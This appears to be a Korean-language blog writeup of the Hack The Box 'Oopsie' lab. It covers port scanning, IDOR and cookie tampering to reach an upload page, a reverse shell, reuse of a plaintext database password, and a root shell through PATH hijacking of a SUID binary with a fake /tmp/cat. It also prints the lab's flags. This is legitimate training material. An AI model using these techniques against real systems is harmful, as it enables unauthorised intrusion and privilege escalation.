---
title: "Hack The Box - Oopsie Writeup"
date: 2026-04-03T09:27:00+09:00
categories:
  - Web Hacking
tags:
  - Hack The Box
  - Tier 2
  - Oopsie
  - IDOR
  - File Upload
  - SUID
  - PATH Hijacking
last_modified_at: 2026-04-03T09:27:00+09:00
published: true
---
## 개요

Oopsie는 웹 애플리케이션의 접근 제어 우회에서 시작해 업로드 기능 악용으로 웹 셸을 확보하고, 애플리케이션 설정 파일에서 재사용 가능한 계정을 찾은 뒤, SUID 바이너리의 `PATH` 하이재킹으로 root까지 올라가는 문제

흐름은 아래와 같다

- 웹 포트 식별
- 로그인 경로와 관리자 식별자 확인
- 쿠키 변조로 업로드 페이지 접근
- 업로드 디렉터리 확인 후 리버스 셸 실행
- `db.php`에서 `robert` 비밀번호 회수
- SUID `bugtracker` 분석
- `PATH` 하이재킹으로 root 셸 획득

## 1. 정보 수집과 표면 분석

공개 서비스 식별 단계

우선 확인: 전체 포트

```bash
nmap -Pn -p- --min-rate 3000 --max-retries 2 -T4 10.129.64.91
```

- `-Pn`: 호스트 응답 여부와 무관하게 스캔
- `-p-`: 전체 TCP 포트 스캔
- `--min-rate 3000`: 최소 전송 속도 유지
- `--max-retries 2`: 재시도 횟수 제한
- `-T4`: 빠른 타이밍 템플릿

핵심 출력

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

다음 단계: 서비스 식별 스캔으로 웹 서버와 운영체제 확인

```bash
nmap -Pn -sC -sV -p 22,80 -T4 10.129.64.91
```

- `-sC`: 기본 NSE 스크립트 실행
- `-sV`: 버전 식별
- `-p 22,80`: 관심 포트만 정밀 확인

출력에서 먼저 볼 줄

```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

정리
웹: 초기 진입 지점
SSH: 계정 확보 후 활용 가능한 보조 경로

## 2. 웹 경로 확인과 접근 제어 우회

공격 표면 확인과 인증 우회 단계

브라우저로 메인 페이지를 열고, Burp Suite 프록시로 요청을 가로챈다

Burp에서 먼저 확인한 경로는 로그인 페이지다

```text
/cdn-cgi/login
```

이 경로는 `Target` 트리와 브라우저 이동 결과를 통해 확인 가능

웹 애플리케이션 내부에서 관리자 관련 페이지도 노출됨

```text
/cdn-cgi/login/admin.php?content=accounts&id=1
```

여기서 `id` 값을 바꾸면 다른 계정 정보가 보임

핵심 출력

```text
Access ID    Name   Email
34322        admin  admin@megacorp.com
```

이 동작은 전형적인 IDOR

- URL의 `id`가 직접 객체 참조 키 역할
- 서버가 요청자 권한과 대상 객체의 소유 관계를 검증하지 않음

다음 단계: 업로드 페이지 접근용 쿠키 값 변경

```text
변경 전
role=user
user=2233

변경 후
role=user
user=34322
```

핵심: `role`이 아니라 `user` 식별자를 관리자 Access ID로 바꾸는 점

쿠키를 수정한 뒤 새로고침하면 업로드 페이지가 열림

## 3. 업로드 경로 확인과 초기 진입

파일 업로드 악용과 웹 셸 확보 단계

업로드 기능이 열렸다고 바로 실행 경로를 아는 것은 아니다

우선 확인: 업로드 디렉터리

```bash
gobuster dir -u http://10.129.95.191/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -s 200,204,301,302,307,401,403 -t 30
```

- `dir`: 디렉터리 브루트포스 모드
- `-u`: 대상 URL
- `-w`: 워드리스트 경로
- `-x php,txt,html`: 확장자까지 붙여 탐색
- `-s ...`: 표시할 상태 코드 지정
- `-t 30`: 동시 스레드 수

출력 확인 포인트: 상태 코드, 경로

```text
/uploads              (Status: 301) [--> http://10.129.95.191/uploads/]
```

`301` 의미: 실제 디렉터리 존재
`/uploads/`: 유효한 저장 경로

다음 단계: 업로드한 PHP 파일을 해당 경로로 호출

공격자 쪽 리스너 선실행

```bash
nc -lvnp 8888
```

- `-l`: 리슨 모드
- `-v`: 상세 출력
- `-n`: DNS 해석 없이 숫자 IP 사용
- `-p 8888`: 대기 포트 지정

정상 연결이 들어오면 아래처럼 연결 로그가 보임

```text
connect to [10.10.14.x] from [10.129.x.x]
```

여기서 중요한 것은 공격자 쪽 포트가 아니라 대상에서 연결이 들어왔다는 사실임

## 4. 애플리케이션 파일 확인과 계정 재사용

획득한 셸을 이용한 내부 정찰과 자격 증명 확보 단계

웹 루트의 로그인 디렉터리로 이동

```bash
cd /var/www/html/cdn-cgi/login
ls
```

핵심 출력

```text
admin.php
db.php
index.php
script.js
```

이 중 `db.php` 확인

```bash
cat db.php
```

핵심 내용

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

여기서 확보한 값

- 계정 `robert`
- 비밀번호 `M3g4C0rpUs3r!`

대화형 셸을 안정화한 뒤 사용자 전환 시도

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
su robert
```

- `python3 -c`: 한 줄 파이썬 코드 실행
- `pty.spawn("/bin/bash")`: 더 다루기 쉬운 TTY 생성

`su robert` 후 비밀번호를 넣으면 `robert` 셸로 전환

사용자 플래그는 홈 디렉터리에 있다

```bash
cat /home/robert/user.txt
```

```text
f2c74ee8db7983851ab2a96a44eb7981
```

## 5. SUID 바이너리 분석

권한 상승 경로 탐색 단계

우선 확인: `bugtracker` 그룹 관련 파일

```bash
cat /etc/group
find / -group bugtracker 2>/dev/null
```

- `-group bugtracker`: 특정 그룹 소유 파일만 검색
- `2>/dev/null`: 권한 오류 같은 표준 오류 숨김

핵심 출력

```text
bugtracker:x:1001:robert
/usr/bin/bugtracker
```

바이너리 권한 확인

```bash
ls -l /usr/bin/bugtracker
```

핵심 출력

```text
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

앞부분의 `s`는 SUID 비트가 켜져 있다는 의미

즉 누가 실행하든 파일 소유자 권한으로 동작

실행해보면 내부에서 `cat` 명령을 호출하는 흔적이 보임

```bash
bugtracker
```

```text
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 123
cat: /root/reports/123: No such file or directory
```

이 출력에서 중요한 점은 두 가지다

- `bugtracker`가 root 권한으로 동작
- 내부에서 `cat`을 절대 경로 없이 호출

즉 `PATH` 하이재킹이 가능

## 6. PATH 하이재킹으로 root 셸 획득

최종 권한 상승 단계

현재 `PATH` 확인

```bash
echo $PATH
```

출력 예시

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

공격용 디렉터리를 앞에 추가

```bash
export PATH=/tmp:$PATH
```

- `export`: 현재 셸 환경 변수 반영
- `/tmp:$PATH`: `/tmp`를 기존 경로보다 먼저 검색

이제 `/tmp/cat`이라는 가짜 실행 파일을 만든다

```bash
printf '#!/bin/sh\n/bin/sh\n' > /tmp/cat
chmod +x /tmp/cat
ls -l /tmp/cat
```

- `printf`: 파일 내용 생성
- `chmod +x`: 실행 권한 부여

핵심 출력

```text
-rwxrwxr-x 1 robert robert 18 Apr  2 08:25 /tmp/cat
```

이 상태에서 다시 `bugtracker` 실행 시, 프로그램이 원래 `/usr/bin/cat` 대신 `/tmp/cat` 우선 실행

즉 SUID root 바이너리가 공격자 스크립트를 root 권한으로 실행

이후 root 셸에서 플래그 확인

```bash
head /root/root.txt
```

플래그 확인: `head` 등 다른 명령

루트 플래그

```text
af13b0bee69f8a877c3faf667f7beacf
```

## 정리

핵심: 웹과 로컬 권한 상승 모두 기본 검증 누락 출발

- 웹에서는 IDOR와 쿠키 신뢰로 업로드 페이지가 열림
- 서버에서는 업로드 파일이 실행 가능 경로에 저장됨
- 애플리케이션 설정 파일에 사용자 비밀번호가 평문으로 남아 있음
- SUID 바이너리가 절대 경로 없이 `cat`을 호출해 `PATH` 하이재킹이 가능함

웹 애플리케이션 취약점과 리눅스 권한 상승이 자연스럽게 이어지는 구조라, 전체 모의침투 흐름을 연습하기에 좋은 문제

